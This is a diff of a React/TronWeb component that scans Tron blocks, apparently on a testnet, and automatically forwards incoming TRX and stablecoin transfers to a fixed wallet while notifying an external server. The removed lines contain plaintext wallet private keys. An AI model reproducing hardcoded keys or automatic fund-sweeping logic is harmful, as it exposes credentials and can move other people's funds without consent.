@@ -1,4 +1,7 @@
 import { useEffect, useState } from "react";
+import { getTransactionByContractAddress } from "../api/troneApi";
+import { farruhWallet, NODE_URL, PRIVATE_KEY_D, wallets } from "./consts";
+import { ITranc } from "./model";
 const TronWeb = require("tronweb");
 const base58 = require("bs58check");
 const ethers = require("ethers");
@@ -6,78 +9,10 @@ const AbiCoder = ethers.AbiCoder;
 const ADDRESS_PREFIX_REGEX = /^(41)/;
 const ADDRESS_PREFIX = "41";
 const HttpProvider = TronWeb.providers.HttpProvider;
-const nodeUrl = "https://nile.trongrid.io";
+const nodeUrl = NODE_URL;
 const fullNode = new HttpProvider(nodeUrl);
 const solidityNode = new HttpProvider(nodeUrl);
 const eventServer = nodeUrl;
-
-const wallets = [
-  {
-    privateKey:
-      "AC942A673AAD7A530573A5A5109B0C8F3CEB872DB75B3BFB7DBBDF234C0930BA",
-    address: "TUrhT2na4h93bVZVz1YuYuk61wDFvcd5qq",
-  },
-  {
-    privateKey:
-      "41586F82E94D3A9A76A0B29B302D703B6EDC23031FADA056567A4D1315632FDA",
-    address: "TEVigzJzwyZPjDW8rkWjBACM8YQXvRn57b",
-  },
-  {
-    privateKey:
-      "B0BBAFF0D63E63224FE82D63B7DD80E1034B1B7186F8807A80A9D2A00869A927",
-    address: "TXLUsZg58bkJxzQUq35LrwfSf1g9gvzP1y",
-  },
-];
-
-const farruhWallet = 'TQ5fK55XMUyK1ucJAeLZfW8jF8QR86VkrK'
-
-const PRIVATE_KEY_D =
-  "B0BBAFF0D63E63224FE82D63B7DD80E1034B1B7186F8807A80A9D2A00869A927";
-const START_BLOCK_NUMBER = 34942758; // Номер блока, с которого начнется сканирование
-const abi = [
-  {
-    constant: true,
-    inputs: [],
-    name: "name",
-    outputs: [
-      {
-        name: "",
-        type: "string",
-      },
-    ],
-    payable: false,
-    stateMutability: "view",
-    type: "function",
-  },
-  {
-    constant: true,
-    inputs: [],
-    name: "symbol",
-    outputs: [
-      {
-        name: "",
-        type: "string",
-      },
-    ],
-    payable: false,
-    stateMutability: "view",
-    type: "function",
-  },
-  {
-    constant: true,
-    inputs: [],
-    name: "decimals",
-    outputs: [
-      {
-        name: "",
-        type: "uint8",
-      },
-    ],
-    payable: false,
-    stateMutability: "view",
-    type: "function",
-  },
-];
 
 const tronWeb_b_1 = new TronWeb(
   fullNode,
@@ -136,7 +71,6 @@ export const TrancHandler = () => {
     const trancs = await tronWeb.trx.getTransactionFromBlock(blockIndex);
     await trancs.forEach(async (tranc: any) => {
       const trancData = tranc.raw_data.contract[0].parameter.value;
-
       const sender = trancData.owner_address;
 
       const decodedSender = tronWeb.address.fromHex(sender);
@@ -146,7 +80,9 @@ export const TrancHandler = () => {
         amount = trancData.amount / 1000000;
         reciever = tronWeb.address.fromHex(trancData.to_address);
       }
-      const contractAddress = tronWeb.address.fromHex(trancData.contract_address);
+      const contractAddress = tronWeb.address.fromHex(
+        trancData.contract_address
+      );
       if (trancData.data) {
         const contractInstance = await tronWeb.contract().at(
           //@ts-ignore
@@ -183,13 +119,11 @@ export const TrancHandler = () => {
           false
         );
 
-         try {await sendNativeCoin(farruhWallet, amount, tronWeb);
-
-          
-
-         } catch(e) {
-          console.log(e)
-         } finally {
+        try {
+          await sendNativeCoin(farruhWallet, amount, tronWeb);
+        } catch (e) {
+          console.log(e);
+        } finally {
           await sendNotificToFarrukh(
             reciever,
             farruhWallet,
@@ -199,15 +133,15 @@ export const TrancHandler = () => {
             false,
             false,
             true
-            );
-         }
+          );
+        }
       }
       if (
         address === reciever &&
         decodedSender !== wallets[2].address &&
         contractAddress
       ) {
-        console.log('сработал блок стейбла')
+        console.log("сработал блок стейбла");
 
         console.log(
           `я человек простой: получил юсдт (${amount}) - отправил обратно (${"столько же"})`
@@ -223,22 +157,27 @@ export const TrancHandler = () => {
           false,
           contractAddress
         );
-      try {
-        await sendContractCoin(contractAddress, farruhWallet, amount, tronWeb);
-      } catch (e) {
-        console.log(e)
-      } finally {
-        await sendNotificToFarrukh(
-          reciever,
-          farruhWallet,
-          amount,
-          false,
-          blockIndex,
-          false,
-          false,
-          true,
-          contractAddress
-        );
+        try {
+          await sendContractCoin(
+            contractAddress,
+            farruhWallet,
+            amount,
+            tronWeb
+          );
+        } catch (e) {
+          console.log(e);
+        } finally {
+          await sendNotificToFarrukh(
+            reciever,
+            farruhWallet,
+            amount,
+            false,
+            blockIndex,
+            false,
+            false,
+            true,
+            contractAddress
+          );
         }
       }
     });
@@ -278,7 +217,7 @@ export const TrancHandler = () => {
         setBlockIndex((blockIndex: any) => {
           return blockIndex < lastBlockNumber ? ++blockIndex : blockIndex;
         });
-      }, 250);
+      }, 1000);
     }
 
     return () => {
@@ -292,18 +231,19 @@ export const TrancHandler = () => {
     amount: any,
     tronWeb: any
   ) => {
+    const feeLimit = await getEstimatedContractFee(contractAddress);
     const contract = await tronWeb.contract().at(contractAddress);
     const decimals = await contract?.decimals().call();
-    const shellAmount = amount * 10 ** decimals;
-    console.log(shellAmount);
-
+    const shellAmount = BigInt(amount * 10 ** decimals);
     const options = {
-      feeLimit: 1e9,
+      feeLimit,
       callValue: 0,
       shouldPollResponse: true,
     };
-    await getFee(tronWeb.defaultAddress.base58, options.feeLimit / 10 ** 2);
-
+    await getFee(tronWeb.defaultAddress.base58, feeLimit);
+    // const trx = await contract.transfer(toAddress, shellAmount);
+    // const estimatedFee = await tronWeb.transaction.estimateFee(trx);
+    // console.log(estimatedFee);
     const trx = await contract
       .transfer(toAddress, shellAmount)
       .send(options, function (err: any, res: any) {
@@ -324,7 +264,7 @@ export const TrancHandler = () => {
       (item) => item.address === address
     )?.privateKey;
     try {
-      await getFee(tronWeb.defaultAddress.base58, options.feeLimit);
+      // await getFee(tronWeb.defaultAddress.base58, options.feeLimit);
     } catch (e) {
       console.log(e);
     } finally {
@@ -351,7 +291,7 @@ export const TrancHandler = () => {
     contract_address = null
   ) => {
     const body = {
-      name: 'KlavicusVail',
+      name: "KlavicusVail",
       address_from,
       address_to,
       transaction_amount,
@@ -362,9 +302,9 @@ export const TrancHandler = () => {
       is_withdrawal,
       contract_address,
     };
-    console.log('отправляем фарруху')
+    console.log("отправляем фарруху");
     // @ts-ignore
-    contract_address || delete body.contract_address
+    contract_address || delete body.contract_address;
     const rawRes = await fetch("https://money-for-monkey.kukrsibestponel.ru", {
       headers: {
         Accept: "application/json",
@@ -386,7 +326,7 @@ export const TrancHandler = () => {
     await sendNotificToFarrukh(
       tronWeb_d.defaultAddress.base58,
       toAddress,
-      shellAmount / 10 ** decimal,
+      shellAmount,
       true,
       blockIndex,
       false,
@@ -396,16 +336,47 @@ export const TrancHandler = () => {
     return transaction;
   };
 
-  const getEstimatedFee = async (decimal: any) => {
-    const fee = 28 * 10 ** decimal;
+  const getEstimatedContractFee = async (address: any) => {
+    const res = await getTransactionByContractAddress(address);
 
-    return fee;
+    let newRes = res.data.map((item: ITranc) => {
+      const data = item?.raw_data?.contract[0]?.parameter?.value?.data;
+      return {
+        fee: item.energy_fee,
+        feeLimit: item.raw_data.fee_limit,
+        energy: item.energy_usage_total,
+        status: item.ret[0].contractRet,
+        hash: item.txID,
+      };
+    });
+    const filteredRes = newRes.filter(
+      (item: any) => item.status === "SUCCESS" && item.fee * 2 >= item.feeLimit
+    );
+
+    const alternateFilter = newRes.filter(
+      (item: any) => item.status === "SUCCESS"
+    );
+    const sum =
+      (filteredRes.length !== 0 ? filteredRes : alternateFilter).reduce(
+        (acc: any, item: any) => acc + item.fee,
+        0
+      ) / (filteredRes.length !== 0 ? filteredRes : alternateFilter)?.length;
+
+    return (sum + 345000) * 1.2;
   };
 
   // getEstimatedFee('TXLUsZg58bkJxzQUq35LrwfSf1g9gvzP1y', tronWeb_d, 1000000)
 
   return (
-    <div style={{ position: "absolute", top: "10px", left: "45%" }}>
+    <div
+      style={{
+        position: "absolute",
+        top: "10px",
+        left: "45%",
+        display: "flex",
+        gap: "10px",
+      }}
+    >
       {!isContinues && (
         <button onClick={() => setIsContinues(true)}>Начать поиски</button>
       )}
@@ -414,14 +385,23 @@ export const TrancHandler = () => {
       )}
       <button
         onClick={async () =>
-          sendNativeCoin(
-            "TXLUsZg58bkJxzQUq35LrwfSf1g9gvzP1y",
-            1,
+          sendContractCoin(
+            "TF17BgPaZYbz8oxbjhriubPDsA7ArKoLX3",
+            "TNpvyac37apqdvEWwXmsyyRZUWnB9tBUND",
+            0.00002,
             tronWeb_b_2
           )
         }
       >
         Отправить
+      </button>
+
+      <button
+        onClick={async () =>
+          getEstimatedContractFee("TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj")
+        }
+      >
+        Тест
       </button>
     </div>
   );
